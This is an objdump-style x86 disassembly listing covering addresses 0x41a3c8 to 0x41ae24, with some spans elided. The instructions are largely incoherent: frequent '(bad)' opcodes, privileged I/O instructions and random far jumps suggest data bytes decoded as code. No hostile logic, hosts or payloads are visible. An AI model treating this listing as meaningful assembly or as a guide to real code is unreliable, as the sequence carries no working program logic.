  41a3c8:	mov    ch,0x58
  41a3ca:	mov    bh,0xf7
  41a3cc:	xchg   BYTE PTR [edx],al
  41a3ce:	jno    0x41a38f
  41a3d0:	(bad)  
  41a3d1:	iret   
  41a3d2:	xor    esp,DWORD PTR [ebx-0x36]
  41a3d5:	push   0xffffffc1
  41a3d7:	inc    esp
  41a3d8:	pop    es
  41a3d9:	retf   0x3f1f
  41a3dc:	popa   
  41a3dd:	into   
  41a3de:	out    0xc2,eax
  41a3e0:	or     al,0x58
  41a3e2:	push   eax
  41a3e3:	mov    al,ds:0xd3633355
  41a3e8:	sbb    dh,cl
  41a3ea:	adc    eax,0xceaa3fe5
  41a3ef:	fs retf 0x4340
  41a3f3:	cmp    DWORD PTR [ebx-0xc],eax
  41a3f6:	push   edx
  41a3f7:	in     al,dx
  41a3f8:	(bad)  
  41a3f9:	shr    BYTE PTR [ecx],0xa4
  41a3fc:	or     bh,BYTE PTR [esi]
  41a3fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3ff:	sti    
  41a400:	out    0x77,al
  41a402:	shl    eax,0xcc
  41a405:	pop    esp
  41a406:	fcmovnb st,st(5)
  41a408:	hlt    
  41a409:	stos   DWORD PTR es:[edi],eax
  41a40a:	(bad)  
  41a40b:	pop    ss
  41a40c:	arpl   cx,si
  41a40e:	jmp    0x41a3f3
  41a410:	push   ss
  41a411:	and    BYTE PTR [ecx+0x78],bl
  41a414:	test   al,0x80
  41a416:	cmp    ebx,DWORD PTR ds:0x299d65f3
  41a41c:	xor    DWORD PTR ds:0x7a5cb71f,esi
  41a422:	rcl    BYTE PTR ds:0xcc06816a,0x7e
  41a429:	int    0xc1
  41a42b:	(bad)  [esi+0x3180935a]
  41a431:	lds    ebx,FWORD PTR [ebx]
  41a433:	jg     0x41a3c1
  41a435:	push   0x6c0e9965
  41a43a:	(bad)
  41a43e:	push   ebx
  41a43f:	lock or BYTE PTR [eax],ah
  41a442:	addr16 fxch st(0)
  41a445:	dec    esp
  41a446:	pop    ds
  41a447:	packsswb mm3,QWORD PTR [ebx+0x43]
  41a44b:	cmp    al,0x25
  41a44d:	out    0xc5,eax
  41a44f:	(bad)  
  41a450:	leave  
  41a451:	pop    ebp
  41a452:	mov    ds:0x3bbea26b,al
  41a457:	pop    ebx
  41a458:	pop    ecx
  41a459:	fdiv   st(7),st
  41a45b:	popa   
  41a45c:	push   0xffffffd3
  41a45e:	int3   
  41a45f:	outs   dx,BYTE PTR ds:[esi]
  41a460:	test   al,0x86
  41a462:	fst    st(4)
  41a464:	call   0x777ea14
  41a469:	ss js  0x41a4ce
  41a46c:	jle    0x41a405
  41a46e:	shl    BYTE PTR [edi-0x12],cl
  41a471:	out    0xb8,al
  41a473:	or     esp,DWORD PTR [eax-0x39b1ff75]
  41a479:	enter  0xf3e6,0x6f
  41a47d:	push   esi
  41a47e:	in     al,0x14
  41a480:	imul   edx,DWORD PTR [eax+ebp*4-0x24],0x8856c788
  41a488:	add    al,0x93
  41a48a:	fwait
  41a48b:	pop    edi
  41a48c:	fs mov esp,0xc45433
	...
  41a4f2:	add    BYTE PTR [eax],al
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	jnp    0x41a523
  41a502:	pop    ss
  41a503:	div    BYTE PTR [eax]
  41a505:	pop    ss
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    eax,0xcd000001
  41a50d:	mov    ebx,0xd9c09f98
  41a512:	push   0xab9faabe
  41a517:	enter  0x9886,0xa1
  41a51b:	push   es
  41a51c:	in     al,0xa8
  41a51e:	mov    DWORD PTR [edi],eax
  41a520:	or     edi,DWORD PTR [edi-0x45]
  41a523:	jp     0x41a57a
  41a525:	adc    esi,ecx
  41a527:	xchg   BYTE PTR [ecx+0x674bd156],ch
  41a52d:	adc    DWORD PTR [ebp-0x681290],eax
  41a533:	stc    
  41a534:	xor    al,0x5b
  41a536:	mov    ebx,0xa025a026
  41a53b:	jmp    0x9ef2:0x72d512b8
  41a542:	fadd   st,st(7)
  41a544:	sub    al,BYTE PTR [eax]
  41a546:	adc    ebx,DWORD PTR [ebp+ecx*8+0x4f]
  41a54a:	ins    DWORD PTR es:[edi],dx
  41a54b:	hlt    
  41a54c:	stc    
  41a54d:	fld    TBYTE PTR [eax+0x27]
  41a550:	sub    ebx,DWORD PTR [eax]
  41a552:	int    0x9d
  41a554:	out    dx,al
  41a555:	adc    bh,bh
  41a557:	adc    al,0xb5
  41a559:	push   ds
  41a55a:	push   ebx
  41a55b:	retf   
  41a55c:	hlt    
  41a55d:	pop    DWORD PTR [eax+0x21e49f2]
  41a563:	mov    edx,0xfc797656
  41a568:	fld    TBYTE PTR [ebx+0x5b]
  41a56b:	sub    ebp,DWORD PTR [ebp+0x422a50ac]
  41a571:	pop    ebp
  41a572:	fld    TBYTE PTR [ebp+ebx*8+0x43c00199]
  41a579:	aaa    
  41a57a:	sub    al,0x83
  41a57c:	and    al,0x5b
  41a57e:	adc    edi,esp
  41a580:	test   DWORD PTR [eax-0x17974994],esi
  41a586:	or     DWORD PTR [eax-0x4d],0xffffffb0
  41a58a:	stos   DWORD PTR es:[edi],eax
  41a58b:	fmul   st(0),st
  41a58d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a58e:	call   0xb770:0x462501ac
  41a595:	pop    eax
  41a596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a597:	lods   eax,DWORD PTR ds:[esi]
  41a598:	push   ebx
  41a599:	scas   al,BYTE PTR es:[edi]
  41a59a:	or     eax,0x277d6248
  41a59f:	in     eax,0x10
  41a5a1:	inc    ecx
  41a5a2:	inc    ecx
  41a5a3:	es mov edi,0x50b521e8
  41a5a9:	out    0x6a,al
  41a5ab:	pushf  
  41a5ac:	pusha  
  41a5ad:	dec    ebx
  41a5ae:	mul    DWORD PTR [edi-0x5a]
  41a5b1:	loope  0x41a59a
  41a5b3:	call   0x398:0x83e2a40c
  41a5ba:	ret    
  41a5bb:	sub    esi,esp
  41a5bd:	pusha  
  41a5be:	popf   
  41a5bf:	or     ecx,DWORD PTR [ebx+0x8]
  41a5c2:	mov    al,ds:0x8dda6761
  41a5c7:	push   0xc9d37359
  41a5cc:	jbe    0x41a592
  41a5ce:	scas   eax,DWORD PTR es:[edi]
  41a5cf:	call   0x1f68:0x473f2867
  41a5d6:	pushf  
  41a5d7:	sar    BYTE PTR ds:0x76c134c1,1
  41a5dd:	ret    0x237a
  41a5e0:	sar    BYTE PTR [ecx+ebx*1+0x77a2dc2e],cl
  41a5e7:	xor    dl,BYTE PTR [ebx-0x302c4975]
  41a5ed:	cwde   
  41a5ee:	loope  0x41a592
  41a5f0:	xor    dh,0x12
  41a5f3:	lds    edi,FWORD PTR [ebx+0x6ca50645]
  41a5f9:	xor    BYTE PTR [edi],0xf5
  41a5fc:	ds ins DWORD PTR es:[edi],dx
  41a5fe:	xor    al,0xfe
  41a600:	sub    al,0x45
  41a602:	ja     0x41a5b4
  41a604:	mov    ah,0x42
  41a606:	js     0x41a660
  41a608:	jecxz  0x41a58e
  41a60a:	inc    eax
  41a60b:	inc    esi
  41a60c:	fdivr  QWORD PTR [ecx+0x5c60e6]
	...
  41a672:	add    BYTE PTR [eax],al
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x4550a625
  41a682:	push   0x1183562
  41a687:	add    BYTE PTR ds:0xe5000001,al
  41a68d:	pop    ecx
  41a68e:	fadd   st,st(6)
  41a690:	xor    DWORD PTR [edx-0x23],edi
  41a693:	loope  0x41a686
  41a695:	and    BYTE PTR [eax+0x68994a50],dh
  41a69b:	cmp    cl,al
  41a69d:	loopne 0x41a63b
  41a69f:	mov    edx,0xd10665ff
  41a6a4:	bound  edx,QWORD PTR [ebp+eax*4-0x2f33e52d]
  41a6ab:	nop
  41a6ac:	(bad)  
  41a6ae:	add    ebp,ecx
  41a6b0:	call   0x90e6:0xe4542dff
  41a6b7:	push   ecx
  41a6b8:	ss pop es
  41a6ba:	push   ss
  41a6bb:	xchg   esp,eax
  41a6bc:	shl    BYTE PTR [ebx+0x75],0x57
  41a6c0:	mov    ebx,DWORD PTR [ecx+0x7f]
  41a6c3:	inc    edx
  41a6c4:	push   ss
  41a6c5:	xor    dh,bh
  41a6c7:	sub    BYTE PTR [esi-0x205d83b9],cl
  41a6cd:	in     al,0x42
  41a6cf:	cmp    bl,BYTE PTR [esi+0x2c]
  41a6d2:	test   eax,0x98e8965a
  41a6d7:	cwde   
  41a6d8:	ror    BYTE PTR [ebp+0x2e],1
  41a6db:	adc    eax,0xe145968
  41a6e0:	in     eax,dx
  41a6e1:	cmp    BYTE PTR [esi-0x1a07c7f4],dl
  41a6e7:	pop    esp
  41a6e8:	mov    ch,BYTE PTR [edi]
  41a6ea:	into   
  41a6eb:	mov    edx,0x7db0d924
  41a6f0:	test   al,0xaf
  41a6f2:	addr16 icebp 
  41a6f4:	jmp    0x41a6ce
  41a6f6:	mov    ebp,0x73a1ca8a
  41a6fb:	cli    
  41a6fc:	lahf   
  41a6fd:	xor    eax,edx
  41a6ff:	out    dx,eax
  41a700:	ins    DWORD PTR es:[edi],dx
  41a701:	pop    eax
  41a702:	in     al,0xdf
  41a704:	int3   
  41a705:	ret    
  41a706:	fadd   DWORD PTR [edx+0x175085f5]
  41a70c:	jmp    0x41a769
  41a70e:	ja     0x41a747
  41a710:	and    ecx,DWORD PTR [esi+ecx*2-0x456ef27]
  41a717:	das    
  41a718:	leave  
  41a719:	iret   
  41a71a:	in     al,0xd9
  41a71c:	cdq    
  41a71d:	push   edx
  41a71e:	sub    eax,0x9a048c23
  41a723:	mov    WORD PTR [esi+0x3b],es
  41a726:	push   0x255cd224
  41a72b:	inc    edi
  41a72c:	mov    WORD PTR [eax+ebp*4],es
  41a72f:	add    BYTE PTR [eax+0x42],0x67
  41a733:	or     eax,0xd71e607a
  41a738:	iret   
  41a739:	gs ds mov esi,0xe5a9dd1
  41a740:	adc    esp,DWORD PTR [edi+0x53372d59]
  41a746:	repz mov WORD PTR [edi],gs
  41a749:	jns    0x41a763
  41a74b:	out    dx,al
  41a74c:	jbe    0x41a6f8
  41a74e:	mov    ebp,0x5ea6722e
  41a753:	pop    ecx
  41a754:	fidiv  DWORD PTR [ecx+edi*8+0x9]
  41a758:	rcl    BYTE PTR [edx+0x56],1
  41a75b:	push   ss
  41a75c:	push   cs
  41a75d:	adc    eax,0xf90e1540
  41a762:	gs inc ecx
  41a764:	sub    DWORD PTR [ecx-0x71],esp
  41a767:	adc    eax,edi
  41a769:	xchg   BYTE PTR [edx-0x6f41adcc],ah
  41a76f:	icebp  
  41a770:	pop    ebp
  41a771:	ds inc edx
  41a773:	sub    eax,0xeff0e76c
  41a778:	aad    0x5
  41a77a:	call   FWORD PTR [edi-0x9]
  41a77d:	push   edx
  41a77e:	aad    0xca
  41a780:	(bad)  
  41a781:	sub    al,0x7
  41a783:	xchg   esp,eax
  41a784:	(bad)
  41a787:	cmp    eax,0x5672046a
  41a78c:	jns    0x41a7ae
  41a78e:	icebp  
  41a78f:	scas   eax,DWORD PTR es:[edi]
  41a790:	in     eax,dx
	...
  41a7f1:	add    BYTE PTR [eax],al
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x725327ca,al
  41a801:	push   esp
  41a802:	xchg   ecx,eax
  41a803:	test   DWORD PTR [edx],edi
  41a805:	sbb    DWORD PTR [ecx],eax
  41a807:	add    BYTE PTR ds:0xa3000001,al
  41a80d:	add    DWORD PTR [edx+eiz*2+0x1c2123f7],edx
  41a814:	sub    al,0x88
  41a816:	mov    esi,cr3
  41a819:	mov    eax,ss
  41a81b:	pop    ds
  41a81c:	jmp    0x1e87:0x5d8d697e
  41a823:	or     BYTE PTR [ebx],dh
  41a825:	adc    edi,ebp
  41a827:	cmp    eax,0x250d923e
  41a82c:	xchg   ebx,eax
  41a82d:	push   0x31d8d162
  41a832:	jno    0x41a801
  41a834:	gs test eax,0x942e513c
  41a83a:	and    esi,DWORD PTR ds:0x5027e0a5
  41a840:	call   0x40c1d739
  41a845:	sbb    eax,0x12a65fb1
  41a84a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a84b:	inc    ebx
  41a84c:	nop
  41a84d:	out    0xfc,eax
  41a84f:	xchg   ecx,eax
  41a850:	or     esi,edx
  41a852:	push   ebx
  41a853:	(bad)  
  41a854:	adc    eax,0x9f2ef9aa
  41a859:	aaa    
  41a85a:	daa    
  41a85b:	loope  0x41a885
  41a85d:	pop    es
  41a85e:	mov    ch,0x6
  41a860:	mov    dh,0x1d
  41a862:	addr16 test al,0x2a
  41a865:	push   eax
  41a866:	jno    0x41a83d
  41a868:	cmp    esi,DWORD PTR [ecx+0x4cd3a63a]
  41a86e:	pop    ds
  41a86f:	cld    
  41a870:	add    eax,0x9881c459
  41a875:	idiv   DWORD PTR [esp+edi*1+0x7e]
  41a879:	sbb    cl,al
  41a87b:	inc    eax
  41a87c:	add    DWORD PTR [edi+0x374b6c4],ebp
  41a882:	rol    BYTE PTR [ebx-0x38],0x13
  41a886:	nop
  41a887:	dec    ecx
  41a888:	stc    
  41a889:	add    ebx,DWORD PTR [ebx]
  41a88b:	jnp    0x41a8b1
  41a88d:	adc    edx,ebx
  41a88f:	add    eax,0x935e7e8f
  41a894:	add    eax,DWORD PTR [ebx-0x77]
  41a897:	push   edx
  41a898:	repz xchg esi,eax
  41a89a:	xor    ch,BYTE PTR [esi]
  41a89c:	mov    WORD PTR [eax-0x16],?
  41a89f:	lods   eax,DWORD PTR ds:[esi]
  41a8a0:	lea    ebx,[esi]
  41a8a2:	push   esi
  41a8a3:	inc    ecx
  41a8a4:	cmp    DWORD PTR [ebx+0xd2ca236],edi
  41a8aa:	fstp   QWORD PTR [esp+esi*8]
  41a8ad:	call   0xa18a:0xa623c940
  41a8b4:	sub    cl,al
  41a8b6:	dec    edi
  41a8b7:	adc    eax,0xf5800f80
  41a8bc:	add    al,0x17
  41a8be:	sub    BYTE PTR [ecx+0x20],0xbe
  41a8c2:	or     dh,BYTE PTR [edx+0x74dc011e]
  41a8c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8c9:	mov    WORD PTR [ebx+edx*1],ss
  41a8cc:	in     al,dx
  41a8cd:	xadd   BYTE PTR [ecx],ah
  41a8d0:	xor    ah,0x9d
  41a8d3:	xchg   ecx,eax
  41a8d4:	or     BYTE PTR [eax-0x38],dl
  41a8d7:	add    dl,BYTE PTR [esi]
  41a8d9:	push   0x2f7317cb
  41a8de:	sbb    eax,0x55aab5e9
  41a8e3:	adc    al,0xac
  41a8e5:	lods   eax,DWORD PTR ds:[esi]
  41a8e6:	call   0x32fa0784
  41a8eb:	pop    esi
  41a8ec:	(bad)  
  41a8ed:	jmp    0xcf8e1dde
  41a8f2:	mov    edx,0x222d3e47
  41a8f7:	sub    eax,0xce7d69bb
  41a8fc:	mul    BYTE PTR [eax-0x74d96455]
  41a902:	test   BYTE PTR [ecx-0x46],0x19
  41a906:	(bad)  
  41a907:	mov    edx,0x3301260e
  41a90c:	cmp    eax,edx
  41a90e:	or     al,0x2a
  41a910:	pop    edx
	...
  41a971:	add    BYTE PTR [eax],al
  41a973:	add    BYTE PTR ds:0xcf4a867e,dh
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	jbe    0x41a948
  41a982:	ror    DWORD PTR [ecx+0x3f],1
  41a985:	sbb    al,BYTE PTR [ecx]
  41a987:	add    BYTE PTR ds:0x1a000001,al
  41a98d:	fcom   QWORD PTR [ecx]
  41a98f:	arpl   WORD PTR [edi],ax
  41a991:	sub    DWORD PTR [ebx+0x5c],eax
  41a994:	mov    BYTE PTR [ecx+0x56],ah
  41a997:	mov    fs,ebx
  41a999:	jge    0x41a91e
  41a99b:	and    al,BYTE PTR [esi+0x60]
  41a99e:	call   0x921785f3
  41a9a3:	adc    eax,0xccd788e
  41a9a8:	mov    ebx,0x26ce3e2d
  41a9ad:	fwait
  41a9ae:	xchg   dh,al
  41a9b0:	test   ebx,ebx
  41a9b2:	mov    ds:0xd580d55d,al
  41a9b7:	fiadd  DWORD PTR [ebp+0x772e2834]
  41a9bd:	outs   dx,BYTE PTR ds:[esi]
  41a9be:	mov    ch,0x82
  41a9c0:	fwait
  41a9c1:	dec    eax
  41a9c2:	pop    eax
  41a9c3:	cmc    
  41a9c4:	push   0x0
  41a9c6:	sub    bl,BYTE PTR [esi+0x536122a5]
  41a9cc:	mov    BYTE PTR [ebp+edi*2-0x3535d3c9],dl
  41a9d3:	jmp    0x41aa3e
  41a9d5:	cmp    BYTE PTR [eax+0x795a3e14],cl
  41a9db:	adc    eax,0x2d5de5c6
  41a9e0:	pop    eax
  41a9e1:	mov    dh,0x66
  41a9e3:	mov    bl,0x7
  41a9e5:	outs   dx,DWORD PTR ds:[esi]
  41a9e6:	lds    eax,FWORD PTR [ebx+0x677ee48f]
  41a9ec:	dec    eax
  41a9ed:	and    eax,0xdb95015b
  41a9f2:	xchg   DWORD PTR [edx-0x6d0a9dc],edx
  41a9f8:	mov    al,ds:0xa57498a8
  41a9fd:	jno    0x41a9e0
  41a9ff:	imul   edi,ecx,0xffffff95
  41aa02:	rol    BYTE PTR [esi-0x6b7a114d],1
  41aa08:	and    eax,0x2902de4c
  41aa0d:	cmp    bh,dl
  41aa0f:	aam    0x85
  41aa11:	or     bh,BYTE PTR [edx+eax*1]
  41aa14:	xchg   DWORD PTR [esi+edi*1],esi
  41aa17:	repz leave 
  41aa19:	jne    0x41a9f3
  41aa1b:	and    al,0x3f
  41aa1d:	sub    BYTE PTR [edx-0x65eba32b],bl
  41aa23:	add    DWORD PTR [edi+0x64f9489d],edx
  41aa29:	test   ch,ah
  41aa2b:	push   esp
  41aa2c:	js     0x41a9f4
  41aa2e:	pop    ebx
  41aa2f:	stc    
  41aa30:	push   ecx
  41aa31:	and    ah,cl
  41aa33:	and    esi,esp
  41aa35:	lods   al,BYTE PTR ds:[esi]
  41aa36:	inc    esp
  41aa37:	push   ds
  41aa38:	sub    ah,0x8d
  41aa3b:	pop    ebp
  41aa3c:	mov    ebp,0xe8124df6
  41aa41:	pop    esp
  41aa42:	mov    dl,0x6f
  41aa44:	add    al,0xd9
  41aa46:	adc    DWORD PTR [ecx],esp
  41aa48:	xor    DWORD PTR [ebx+0xc],esi
  41aa4b:	ins    DWORD PTR es:[edi],dx
  41aa4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa4d:	sub    al,0x72
  41aa4f:	repz xor al,0xc0
  41aa52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa53:	cmp    eax,0xf2fa6a35
  41aa58:	ror    bh,0x2b
  41aa5b:	push   0xa52cf63b
  41aa60:	jo     0x41aa7e
  41aa62:	or     edx,DWORD PTR [eax+0x28e8cb04]
  41aa68:	icebp  
  41aa69:	add    eax,0x27de3324
  41aa6e:	mov    BYTE PTR [edi-0x822cde2],ah
  41aa74:	jne    0x41aa29
  41aa76:	nop
  41aa77:	ins    DWORD PTR es:[edi],dx
  41aa78:	loope  0x41aa58
  41aa7a:	xor    edx,ebp
  41aa7c:	pushf  
  41aa7d:	xchg   esi,eax
  41aa7e:	jl     0x41aa6b
  41aa80:	lods   al,BYTE PTR ds:[esi]
  41aa81:	xor    al,0x72
  41aa83:	mov    eax,ebp
  41aa85:	stc    
  41aa86:	ja     0x41aa93
  41aa88:	mov    eax,ds:0xb91699ef
  41aa8d:	add    eax,0xc39b5e
	...
  41aaf2:	add    BYTE PTR [eax],al
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	pop    ebx
  41ab01:	aad    0x6a
  41ab03:	cld    
  41ab04:	inc    esp
  41ab05:	sbb    eax,DWORD PTR [ecx]
  41ab07:	add    BYTE PTR ds:0xa5000001,al
  41ab0d:	aad    0x60
  41ab0f:	jp     0x41ab1e
  41ab11:	inc    edi
  41ab12:	sub    DWORD PTR [ebx-0x640702dd],edx
  41ab18:	fsub   QWORD PTR [ebx]
  41ab1a:	jge    0x41aafe
  41ab1c:	jmp    0x8533:0xef482c42
  41ab23:	mov    bl,0xde
  41ab25:	dec    ebx
  41ab26:	jo     0x41ab2c
  41ab28:	jle    0x41ab82
  41ab2a:	aas    
  41ab2b:	imul   ecx,edx,0x2a
  41ab2e:	jae    0x41ab14
  41ab30:	sub    DWORD PTR [esi+0x26d10f3d],esp
  41ab36:	add    BYTE PTR [ecx+0x5b],ch
  41ab39:	aaa    
  41ab3a:	sar    esi,1
  41ab3c:	les    ebx,FWORD PTR [edx+0x54f87f45]
  41ab42:	lds    esi,FWORD PTR [edi-0x5b447ba2]
  41ab48:	jns    0x41ab70
  41ab4a:	pop    esp
  41ab4b:	push   0x77
  41ab4d:	ins    DWORD PTR es:[edi],dx
  41ab4e:	loopne 0x41ab2f
  41ab50:	push   ebp
  41ab51:	ret    0x60a5
  41ab54:	fwait
  41ab55:	popf   
  41ab56:	out    dx,eax
  41ab57:	adc    bl,BYTE PTR [ebx+0x53]
  41ab5a:	push   es
  41ab5b:	cwde   
  41ab5c:	nop
  41ab5d:	outs   dx,BYTE PTR ds:[esi]
  41ab5e:	pop    ecx
  41ab5f:	dec    ecx
  41ab60:	inc    ebx
  41ab61:	stos   DWORD PTR es:[edi],eax
  41ab62:	leave  
  41ab63:	push   cs
  41ab64:	repnz fwait
  41ab66:	mov    DWORD PTR [edx],eax
  41ab68:	jnp    0x41ab07
  41ab6a:	jmp    0x32d5:0x6e9d04d3
  41ab71:	(bad)  
  41ab72:	les    ebx,FWORD PTR [ebx+0x40e1b118]
  41ab78:	mov    eax,ds:0x5dfeaf26
  41ab7d:	adc    BYTE PTR [edx-0x49],bl
  41ab80:	jge    0x41ab46
  41ab82:	das    
  41ab83:	sbb    eax,0x5b0ed480
  41ab88:	fwait
  41ab89:	cmp    ebx,DWORD PTR [esi+ebx*2]
  41ab8c:	xor    bh,BYTE PTR [eax-0x3fcc2fb6]
  41ab92:	cmp    al,0x2f
  41ab94:	mov    ch,0x8e
  41ab96:	jl     0x41abe5
  41ab98:	push   ss
  41ab99:	(bad)  
  41ab9a:	sub    ebx,DWORD PTR [ebp-0x224b0813]
  41aba0:	lock lahf 
  41aba2:	pop    ebx
  41aba4:	cli    
  41aba5:	jns    0x41ab5c
  41aba7:	pop    ecx
  41aba8:	stos   BYTE PTR es:[edi],al
  41aba9:	push   ss
  41abaa:	(bad)  
  41abab:	sub    edi,DWORD PTR [ecx]
  41abad:	adc    DWORD PTR [esi],edx
  41abaf:	xor    DWORD PTR [edi+0x36],0xffffffab
  41abb3:	fwait
  41abb4:	cmp    al,0xdd
  41abb6:	pop    esp
  41abb7:	cmp    ecx,edx
  41abb9:	(bad)  
  41abba:	or     al,0x4e
  41abbc:	inc    ecx
  41abbd:	mov    edx,0x3934a65c
  41abc2:	inc    ecx
  41abc3:	push   0x9492411a
  41abc8:	nop
  41abc9:	daa    
  41abca:	cld    
  41abcb:	add    al,0x98
  41abcd:	or     ch,BYTE PTR [esp+ebx*4]
  41abd0:	xchg   esi,eax
  41abd1:	or     cx,WORD PTR [ebp+0x41053740]
  41abd8:	lock scas eax,DWORD PTR es:[edi]
  41abda:	pop    ebp
  41abdb:	nop
  41abdc:	mov    esi,0x8cf3e995
  41abe1:	push   0x55bd7fef
  41abe6:	mov    dl,BYTE PTR [esi]
  41abe8:	push   cs
  41abe9:	(bad)  
  41abea:	ins    BYTE PTR es:[edi],dx
  41abeb:	ins    BYTE PTR es:[edi],dx
  41abec:	push   ebx
  41abed:	jne    0x41ab86
  41abef:	push   edx
  41abf0:	push   ecx
  41abf1:	icebp  
  41abf2:	loope  0x41abf3
  41abf4:	arpl   WORD PTR [edx+eax*4+0x29b44a54],cx
  41abfb:	fldcw  WORD PTR [edx-0x629e0c1]
  41ac01:	mov    DWORD PTR [esi-0x114b9865],esi
  41ac07:	repnz mov eax,ds:0x82421db6
  41ac0d:	fstp   DWORD PTR [edi+0x2fae]
	...
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [edx+edi*2-0x1d]
  41ac82:	adc    al,0xb5
  41ac84:	dec    ecx
  41ac85:	sbb    al,0x1
  41ac87:	add    BYTE PTR ds:0x94000001,al
  41ac8d:	mov    esi,ebx
  41ac8f:	inc    edx
  41ac90:	push   cs
  41ac91:	adc    eax,0x2937f059
  41ac96:	rcl    esi,1
  41ac98:	repz xchg esi,eax
  41ac9a:	pusha  
  41ac9b:	sub    eax,esp
  41ac9d:	mov    ecx,0x8f219121
  41aca2:	mov    ecx,0x913ad15
  41aca7:	lock inc DWORD PTR [eax+0x25077a10]
  41acae:	mov    ch,0x5c
  41acb0:	mov    BYTE PTR ds:0x8b614358,dl
  41acb6:	iret   
  41acb7:	call   DWORD PTR [eax-0x7d8dbbb8]
  41acbd:	cli    
  41acbe:	fidivr DWORD PTR [edi+0x4b441cf1]
  41acc4:	mov    ah,0x14
  41acc6:	xchg   edx,eax
  41acc7:	pop    ebx
  41acc8:	and    eax,0xda871fcb
  41accd:	aas    
  41acce:	data16 (bad) 
  41acd0:	jmp    0x6207f967
  41acd5:	(bad)  
  41acd6:	pop    esi
  41acd7:	mov    DWORD PTR [eax+ecx*4-0x3c],esi
  41acdb:	sbb    BYTE PTR [eax-0x2fe48646],0xcc
  41ace2:	push   cs
  41ace3:	data16 fbstp TBYTE PTR [eax]
  41ace6:	cmc    
  41ace7:	fwait
  41ace8:	jb     0x41ace6
  41acea:	push   ebx
  41aceb:	or     edx,DWORD PTR [ebx+0x326a182c]
  41acf1:	xchg   edi,eax
  41acf2:	pop    ds
  41acf3:	or     eax,0x6cb8a0e3
  41acf8:	dec    edi
  41acf9:	sahf   
  41acfa:	xchg   esi,eax
  41acfb:	adc    BYTE PTR [edi+ebx*8],ah
  41acfe:	xor    ah,BYTE PTR [esi]
  41ad00:	or     ch,cl
  41ad02:	(bad)  
  41ad03:	(bad)  
  41ad04:	push   esi
  41ad05:	push   edi
  41ad06:	addr16 push ss
  41ad08:	fisub  DWORD PTR [edx+0x230cd463]
  41ad0e:	fnstenv [eax+0x76525a6a]
  41ad14:	test   al,0xf7
  41ad16:	push   cs
  41ad17:	out    dx,al
  41ad18:	(bad)  
  41ad19:	arpl   WORD PTR [ecx+0x7e],ax
  41ad1c:	jmp    0x189cb9bf
  41ad21:	test   BYTE PTR [esi+0x6],ch
  41ad24:	cmp    DWORD PTR [eax-0x71],edx
  41ad27:	push   es
  41ad28:	ret    
  41ad29:	cmp    al,0x13
  41ad2b:	in     eax,0x4c
  41ad2d:	test   eax,0x6a86542d
  41ad32:	xor    DWORD PTR [ebx-0x7b05e41],edx
  41ad38:	cld    
  41ad39:	mov    eax,0x92386c3b
  41ad3e:	scas   al,BYTE PTR es:[edi]
  41ad3f:	push   ebp
  41ad40:	mov    ds:0xd4234d4b,eax
  41ad45:	(bad)  
  41ad46:	jmp    0x3b38:0x326a0007
  41ad4d:	and    eax,0x82de52da
  41ad52:	out    dx,al
  41ad53:	pop    edx
  41ad54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad55:	push   edi
  41ad56:	sbb    edi,DWORD PTR [ebx]
  41ad58:	jle    0x41ad37
  41ad5a:	clc    
  41ad5b:	fxch   st(1)
  41ad5d:	sub    al,0x76
  41ad5f:	pusha  
  41ad60:	jecxz  0x41ad26
  41ad62:	imul   BYTE PTR [ebp-0x5a8d116d]
  41ad68:	scas   eax,DWORD PTR es:[edi]
  41ad69:	jae    0x41ad8e
  41ad6b:	(bad)  
  41ad6c:	leave  
  41ad6d:	or     ebp,ebp
  41ad6f:	leave  
  41ad70:	pop    esp
  41ad71:	mov    bh,0x9d
  41ad73:	fadd   DWORD PTR [edx-0x78d81f9a]
  41ad79:	ds xchg edi,eax
  41ad7b:	pop    ebp
  41ad7c:	sbb    BYTE PTR [ebx-0x30],dh
  41ad7f:	pop    es
  41ad80:	or     al,BYTE PTR [ebx]
  41ad82:	mov    ecx,0x9ab4f6bd
  41ad87:	mov    ebx,0x18b5dd7
  41ad8c:	rol    esp,cl
  41ad8e:	fbstp  TBYTE PTR [ebx]
  41ad90:	and    al,BYTE PTR [eax]
	...
  41adf2:	add    BYTE PTR [eax],al
  41adf4:	push   ebp
  41adf5:	clc    
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [esp+esi*1+0x4ed5004f],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	sar    DWORD PTR [esi],0x9e
  41ae0f:	add    cl,BYTE PTR gs:[ecx]
  41ae12:	push   esi
  41ae13:	mov    al,ds:0x5b50bcf
  41ae18:	sahf   
  41ae19:	imul   esi,DWORD PTR [ecx+0x4593c1e4],0xffffff8f
  41ae20:	dec    BYTE PTR fs:[edx+esi*8]
  41ae24:	and    DWORD PTR [eax+0x2e21e8cb],esi
